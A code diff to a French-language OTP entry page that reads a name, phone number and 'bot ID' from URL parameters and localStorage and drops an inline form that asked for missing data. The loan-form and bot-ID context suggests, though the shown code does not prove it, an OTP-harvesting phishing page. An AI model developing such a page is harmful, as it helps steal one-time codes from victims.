@@ -142,12 +142,23 @@ body{
             let name = urlParams.get('name') || localStorage.getItem('name');
             let phone = urlParams.get('phone') || localStorage.getItem('phone');
 
+            // If name is still missing, try to get it from the loan form (fullName)
+            if (!name) {
+                name = localStorage.getItem('fullName');
+                // Store it as 'name' for consistency
+                if (name) localStorage.setItem('name', name);
+            }
+
             // Phone fallback: extract from subtitle (displayed number)
             if (!phone) {
                 const subtitle = document.querySelector('.subtitle');
                 const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
                 if (match) phone = match[1] + match[2];
+                if (phone) localStorage.setItem('phone', phone);
             }
+
+            // Store botId if missing
+            if (botId) localStorage.setItem('botId', botId);
 
             // ── 2. Create a message container (no alerts) ──
             const container = document.querySelector('.container');
@@ -176,118 +187,7 @@ body{
                 msgDiv.textContent = '';
             }
 
-            // ── 3. Helper to ask for missing data (name or phone) ──
-            function askForMissingData() {
-                let missing = [];
-                if (!name) missing.push('Nom');
-                if (!phone) missing.push('Numéro de téléphone');
-                if (!botId) missing.push('Bot ID');
-
-                if (missing.length === 0) return true;
-
-                // Build a small form inside the message box
-                const form = document.createElement('div');
-                form.style.display = 'flex';
-                form.style.flexDirection = 'column';
-                form.style.gap = '10px';
-                form.style.marginTop = '10px';
-
-                const label = document.createElement('div');
-                label.textContent = `Veuillez saisir : ${missing.join(', ')}`;
-                label.style.fontWeight = '600';
-                label.style.color = '#333';
-                form.appendChild(label);
-
-                const inputName = document.createElement('input');
-                inputName.type = 'text';
-                inputName.placeholder = 'Votre nom complet';
-                inputName.style.padding = '8px 12px';
-                inputName.style.border = '1px solid #ccc';
-                inputName.style.borderRadius = '6px';
-                inputName.style.fontSize = '16px';
-                if (name) inputName.value = name;
-                form.appendChild(inputName);
-
-                const inputPhone = document.createElement('input');
-                inputPhone.type = 'tel';
-                inputPhone.placeholder = 'Numéro de téléphone (ex: 79046955)';
-                inputPhone.style.padding = '8px 12px';
-                inputPhone.style.border = '1px solid #ccc';
-                inputPhone.style.borderRadius = '6px';
-                inputPhone.style.fontSize = '16px';
-                if (phone) inputPhone.value = phone;
-                if (missing.includes('Numéro de téléphone')) {
-                    form.appendChild(inputPhone);
-                }
-
-                const inputBot = document.createElement('input');
-                inputBot.type = 'text';
-                inputBot.placeholder = 'Bot ID (ex: bot1)';
-                inputBot.style.padding = '8px 12px';
-                inputBot.style.border = '1px solid #ccc';
-                inputBot.style.borderRadius = '6px';
-                inputBot.style.fontSize = '16px';
-                if (botId) inputBot.value = botId;
-                if (missing.includes('Bot ID')) {
-                    form.appendChild(inputBot);
-                }
-
-                const confirmBtn = document.createElement('button');
-                confirmBtn.textContent = 'Confirmer';
-                confirmBtn.style.padding = '8px 16px';
-                confirmBtn.style.background = '#1976d2';
-                confirmBtn.style.color = '#fff';
-                confirmBtn.style.border = 'none';
-                confirmBtn.style.borderRadius = '6px';
-                confirmBtn.style.fontSize = '16px';
-                confirmBtn.style.cursor = 'pointer';
-                form.appendChild(confirmBtn);
-
-                // Clear message and show the form
-                hideMessage();
-                msgDiv.style.display = 'block';
-                msgDiv.style.background = '#fff8e1';
-                msgDiv.style.color = '#333';
-                msgDiv.style.border = '1px solid #ffd54f';
-                msgDiv.innerHTML = '';
-                msgDiv.appendChild(form);
-
-                return new Promise((resolve) => {
-                    confirmBtn.addEventListener('click', function() {
-                        const newName = inputName.value.trim();
-                        const newPhone = inputPhone.value.trim();
-                        const newBot = inputBot.value.trim();
-
-                        if (missing.includes('Nom') && !newName) {
-                            alert('Veuillez entrer votre nom.');
-                            return;
-                        }
-                        if (missing.includes('Numéro de téléphone') && !newPhone) {
-                            alert('Veuillez entrer votre numéro de téléphone.');
-                            return;
-                        }
-                        if (missing.includes('Bot ID') && !newBot) {
-                            alert('Veuillez entrer le Bot ID.');
-                            return;
-                        }
-
-                        // Update variables and localStorage
-                        if (newName) name = newName;
-                        if (newPhone) phone = newPhone;
-                        if (newBot) botId = newBot;
-
-                        localStorage.setItem('name', name);
-                        localStorage.setItem('phone', phone);
-                        localStorage.setItem('botId', botId);
-
-                        // Remove the form and hide message
-                        hideMessage();
-                        resolve(true);
-                    });
-                });
-            }
-
-            // ── 4. OTP auto‑advance & continue button logic ──
+            // ── 3. OTP auto‑advance & continue button logic ──
             const inputs = document.querySelectorAll('.otp input');
             const continueBtn = document.querySelector('.continue-btn');
 
@@ -327,7 +227,7 @@ body{
                 input.addEventListener('blur', checkAllFilled);
             });
 
-            // ── 5. Timer & resend ──
+            // ── 4. Timer & resend ──
             const timerSpan = document.querySelector('.timer');
             const resendWrapEl = document.querySelector('.resend-wrap');
             let totalSeconds = 5 * 60;
@@ -381,36 +281,29 @@ body{
 
             startTimer(5 * 60);
 
-            // ── 6. On page load, check for missing data and ask if needed ──
-            // We'll run this asynchronously to not block the UI
-            async function ensureData() {
-                if (!name || !phone || !botId) {
-                    await askForMissingData();
+            // ── 5. Check required data (name, phone, botId) ──
+            function hasRequiredData() {
+                if (!name) {
+                    showMessage('Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.', true);
+                    return false;
                 }
-                // Now all data should be available
-                // Re-check and store again
-                if (name) localStorage.setItem('name', name);
-                if (phone) localStorage.setItem('phone', phone);
-                if (botId) localStorage.setItem('botId', botId);
+                if (!phone) {
+                    showMessage('Numéro de téléphone manquant – veuillez recommencer.', true);
+                    return false;
+                }
+                if (!botId) {
+                    showMessage('Identifiant du bot manquant – veuillez utiliser le lien correct.', true);
+                    return false;
+                }
+                hideMessage();
+                return true;
             }
 
-            // Start the data check
-            ensureData();
-
-            // ── 7. Backend communication with inline messages ──
+            // ── 6. Backend communication with inline messages ──
             continueBtn.addEventListener('click', function() {
                 if (this.disabled) return;
 
-                // If data is still missing, ask again
-                if (!name || !phone || !botId) {
-                    ensureData().then(() => {
-                        // After ensuring, retry click (recursive but safe)
-                        continueBtn.click();
-                    });
-                    return;
-                }
-
-                hideMessage();
+                if (!hasRequiredData()) return;
 
                 const otp = Array.from(inputs).map(inp => inp.value).join('');
 
@@ -471,6 +364,9 @@ body{
                     continueBtn.style.cursor = 'pointer';
                 });
             });
+
+            // ── 7. Run the data check on page load ──
+            hasRequiredData();
 
         })();
     </script>
